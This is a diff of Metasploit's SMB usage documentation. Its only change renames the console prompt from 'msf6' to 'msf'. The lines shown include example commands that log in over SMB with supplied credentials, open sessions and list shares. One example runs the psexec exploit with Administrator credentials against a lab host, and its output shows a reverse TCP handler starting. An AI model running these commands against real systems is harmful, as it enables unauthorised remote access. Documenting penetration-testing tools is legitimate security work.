@@ -24,13 +24,13 @@ Metasploit has support for multiple SMB modules, including:
 There are more modules than listed here, for the full list of modules run the `search` command within msfconsole:
 
 ```msf
-msf6 > search smb
+msf > search smb
 ```
 
 Or to search for modules that work with a specific session type:
 
 ```msf
-msf6 > search session_type:smb
+msf > search session_type:smb
 ```
 
 ### Lab Environment
@@ -75,7 +75,7 @@ When using the smb_login module, the CreateSession option can be used to obtain 
 session within the smb instance. Running with the following options:
 
 ```msf
-msf6 auxiliary(scanner/smb/smb_login) > run CreateSession=true RHOSTS=172.14.2.164 RPORT=445 SMBDomain=windomain.local SMBPass=password SMBUser=username
+msf auxiliary(scanner/smb/smb_login) > run CreateSession=true RHOSTS=172.14.2.164 RPORT=445 SMBDomain=windomain.local SMBPass=password SMBUser=username
 ```
 
 Should give you output similar to 
@@ -86,14 +86,14 @@ Should give you output similar to
 [*] SMB session 1 opened (172.16.158.1:62793 -> 172.14.2.164:445) at 2024-03-12 17:03:09 +0000
 [*] 172.14.2.164:445    - Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
-msf6 auxiliary(scanner/smb/smb_login) > sessions -i -1
+msf auxiliary(scanner/smb/smb_login) > sessions -i -1
 [*] Starting interaction with 1...
 ```
 
 Which you can interact with using `sessions -i <session id>` or `sessions -i -1` to interact with the most recently opened session.
 
 ```msf
-msf6 auxiliary(scanner/smb/smb_login) > sessions -i -1
+msf auxiliary(scanner/smb/smb_login) > sessions -i -1
 [*] Starting interaction with 1...
 
 SMB (172.14.2.164) > shares
@@ -315,8 +315,8 @@ Details on the Kerberos specific option names are documented in [[Kerberos Servi
 Running psexec against a host:
 
 ```msf
-msf6 > use exploit/windows/smb/psexec
-msf6 exploit(windows/smb/psexec) > run rhost=192.168.123.13 username=Administrator password=p4$$w0rd smb::auth=kerberos domaincontrollerrhost=192.168.123.13 smb::rhostname=dc3.demo.local domain=demo.local
+msf > use exploit/windows/smb/psexec
+msf exploit(windows/smb/psexec) > run rhost=192.168.123.13 username=Administrator password=p4$$w0rd smb::auth=kerberos domaincontrollerrhost=192.168.123.13 smb::rhostname=dc3.demo.local domain=demo.local
 
 [*] Started reverse TCP handler on 192.168.123.1:4444
 [*] 192.168.123.13:445 - Connecting to the server...
